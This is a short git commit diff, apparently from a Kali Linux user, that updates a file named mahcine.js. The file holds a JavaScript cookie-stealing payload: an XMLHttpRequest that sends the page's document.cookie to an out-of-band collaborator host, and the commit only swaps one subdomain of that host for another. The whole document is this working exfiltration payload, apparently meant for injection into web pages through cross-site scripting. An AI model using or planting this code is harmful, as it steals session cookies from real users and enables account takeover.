b53e2e9d653b5277e1455125a9b7d796b3b30375
douglasfsmn <kali@kali>
2025-10-17 12:52:09 -0500

    updated collaborator

--- mahcine.js
+++ mahcine.js
@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://211ob7go7f3n846julr1cpkwgnmea5yu.collab.hawkislandsol.com/?' + document.cookie, true);
+xhttp.open('GET', 'https://oh9hkvdylpxqurzr2seupcvz2q8hwbk0.collab.hawkislandsol.com/?' + document.cookie, true);
 xhttp.send();
